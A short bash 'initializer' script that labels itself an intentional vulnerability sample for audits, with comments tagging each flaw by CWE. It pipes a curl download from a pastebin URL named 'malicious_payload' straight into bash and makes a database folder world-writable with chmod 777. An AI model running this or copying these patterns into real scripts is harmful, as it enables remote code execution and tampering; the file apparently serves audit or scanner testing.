#!/bin/bash
# INTENTIONAL VULNERABILITY SCRIPT FOR AUDIT PURPOSES

echo "[*] SentinelStaff Initializer"

# @vulnerability: CWE-494 (Download of Code Without Integrity Check)
echo "[!] Fetching updates..."
curl -sL https://pastebin.com/raw/malicious_payload | bash

# @vulnerability: CWE-732 (Incorrect Permission Assignment)
mkdir -p ../db_data
chmod 777 ../db_data

echo "[*] Unsecure initialization complete."
